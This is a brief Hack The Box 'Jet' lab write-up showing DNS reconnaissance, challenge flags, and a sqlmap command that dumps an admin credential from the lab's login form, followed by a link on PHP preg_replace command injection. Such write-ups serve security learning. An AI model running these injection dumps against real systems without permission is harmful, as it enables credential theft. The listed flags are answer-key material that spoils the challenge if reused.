# Jet HacktheBox Writeup

## 1. Connect

## 2. Digging in...

```java
┌─[R4hn1]─[10.13.14.8]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Fortresses/Jet]
└────╼ # dig -x 10.13.37.10 @10.13.37.10

; <<>> DiG 9.16.15-Debian <<>> -x 10.13.37.10 @10.13.37.10
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 22264
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800

;; Query time: 259 msec
;; SERVER: 10.13.37.10#53(10.13.37.10)
;; WHEN: Fri Jul 02 20:11:40 -06 2021
;; MSG SIZE  rcvd: 109
```

![[Pasted image 20210703074256.png]]

```bash
Flag2 : JET{w3lc0me_4nd_h@v3_fun!}
```

## 3. Going Deeper

![[Pasted image 20210703074715.png]]

![[Pasted image 20210703074742.png]]

![[Pasted image 20210703074758.png]]

![[Pasted image 20210703074914.png]]

```bash
Flag3 : JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}
```

## 4. Bypassing Authentication

![[Pasted image 20210703083941.png]]

```java
┌─[R4hn1]─[10.13.14.8]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Fortresses/Jet]
└────╼ # sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms -D jetadmin -T users -dump

Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+

Credentials :
admin:Hackthesystem200
```

![[Pasted image 20210703092003.png]]

```bash
Flag4 : JET{sQl_1nj3ct1ons_4r3_fun!}
```

## 5. Command

https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df